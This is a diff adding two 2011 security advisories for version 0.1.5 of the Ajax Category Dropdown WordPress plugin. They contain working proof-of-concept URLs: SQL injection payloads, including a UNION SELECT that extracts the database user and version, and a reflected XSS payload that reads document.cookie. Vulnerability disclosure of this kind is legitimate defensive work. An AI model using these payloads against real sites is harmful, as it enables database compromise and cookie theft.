@@ -1,0 +1,47 @@
+=============================
+Vulnerability ID: HTB22946
+Reference: http://www.htbridge.ch/advisory/multiple_sql_injection_in_ajax_category_dropdown_wordpress_plugin.html
+Product:  Ajax Category Dropdown wordpress plugin
+Vendor: http://www.dyasonhat.com/ ( http://www.dyasonhat.com/ ) 
+Vulnerable Version: 0.1.5
+Vendor Notification: 07 April 2011 
+Vulnerability Type: SQL Injection
+Risk level: High 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php" script to properly sanitize user-supplied input.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+http://[host]/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?savepostcat&post_id=1&category_id=SQL_CODE_HERE
+http://[host]/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?get_form_countries&cat_id=SQL_CODE_HERE
+http://[host]/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?admin&category_level=2&category_id=1%20union%20select%201,user%28%29,3,4,5,6,7,8,9,version%28%29%20--%201
+
+
+=============================
+Vulnerability ID: HTB22947
+Reference: http://www.htbridge.ch/advisory/xss_in_ajax_category_dropdown_wordpress_plugin.html
+Product: Ajax Category Dropdown wordpress plugin
+Vendor: http://www.dyasonhat.com/ ( http://www.dyasonhat.com/ ) 
+Vulnerable Version: 0.1.5
+Vendor Notification: 07 April 2011 
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+The vulnerability exists due to failure in the "/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php" script to properly sanitize user-supplied input in "category_id" variable.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+
+http://[host]/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?admin&category_id=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+
+
